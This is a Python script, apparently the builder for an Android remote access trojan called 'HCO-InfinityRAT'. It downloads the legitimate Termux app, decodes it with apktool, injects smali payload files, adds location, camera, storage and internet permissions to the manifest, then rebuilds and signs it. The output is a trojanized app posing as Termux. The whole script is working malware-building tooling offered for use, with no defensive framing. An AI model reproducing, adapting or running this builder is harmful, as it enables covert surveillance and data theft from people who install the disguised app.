import os
import requests
import shutil
import subprocess
import time
import xml.etree.ElementTree as ET

BASE_APK_URL = "https://f-droid.org/repo/com.termux_118.apk"
LOCAL_BASE_APK = "base_apk/base.apk"
TARGET_BASE_APK = "base.apk"
PAYLOAD_SMALI_DIR = "smali_payload"
TARGET_SMALI_PATH = "payload_template/smali"
TARGET_APK = "HCO-RAT-unsigned.apk"
SIGNED_APK = "HCO-RAT-signed.apk"
KEYSTORE = "rat-key.keystore"

def ensure_base_apk():
    if os.path.exists(TARGET_BASE_APK):
        print("[✓] base.apk already exists.")
        return
    if os.path.exists(LOCAL_BASE_APK):
        print("[+] Copying default base.apk from base_apk directory...")
        shutil.copy(LOCAL_BASE_APK, TARGET_BASE_APK)
        return
    print("[+] Downloading base.apk from F-Droid...")
    try:
        r = requests.get(BASE_APK_URL, stream=True)
        with open(TARGET_BASE_APK, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
        print("[✓] base.apk downloaded successfully.")
    except Exception as e:
        print("[X] Failed to download base.apk:", str(e))
        exit(1)

def decode_apk():
    print("[+] Decoding base.apk with apktool...")
    subprocess.run(["apktool", "d", TARGET_BASE_APK, "-o", "payload_template", "--force-all"])

def inject_smali_payload():
    print("[+] Injecting smali payload...")
    for root, _, files in os.walk(PAYLOAD_SMALI_DIR):
        for file in files:
            if file.endswith(".smali"):
                rel_dir = os.path.relpath(root, PAYLOAD_SMALI_DIR)
                target_dir = os.path.join(TARGET_SMALI_PATH, rel_dir)
                os.makedirs(target_dir, exist_ok=True)
                shutil.copy(os.path.join(root, file), os.path.join(target_dir, file))
    print("[✓] Smali payload injected.")

def modify_manifest():
    print("[+] Modifying AndroidManifest.xml...")
    manifest_path = "payload_template/AndroidManifest.xml"
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    manifest = root

    permissions = [
        "android.permission.INTERNET",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.CAMERA",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE"
    ]

    for perm in permissions:
        found = any(elem.get('android:name') == perm for elem in manifest.findall('uses-permission'))
        if not found:
            ET.SubElement(manifest, "uses-permission", {"android:name": perm})

    tree.write(manifest_path)
    print("[✓] AndroidManifest.xml updated.")

def build_apk():
    print("[+] Rebuilding APK...")
    subprocess.run(["apktool", "b", "payload_template", "-o", TARGET_APK])
    print("[✓] APK built:", TARGET_APK)

def sign_apk():
    print("[+] Signing APK...")
    if not os.path.exists(KEYSTORE):
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", KEYSTORE,
            "-alias", "ratkey", "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-storepass", "password", "-keypass", "password",
            "-dname", "CN=HCO RAT, OU=HCO, O=Hackers Colony, L=World, S=Planet, C=IN"
        ])

    subprocess.run([
        "jarsigner", "-verbose", "-keystore", KEYSTORE,
        "-storepass", "password", "-keypass", "password",
        "-signedjar", SIGNED_APK, TARGET_APK, "ratkey"
    ])
    print("[✓] APK signed:", SIGNED_APK)

def main():
    print("=== HCO-InfinityRAT APK Builder (Auto) ===")
    time.sleep(1)
    ensure_base_apk()
    decode_apk()
    inject_smali_payload()
    modify_manifest()
    build_apk()
    sign_apk()
    print("✅ Done! Final APK →", SIGNED_APK)

if __name__ == "__main__":
    main()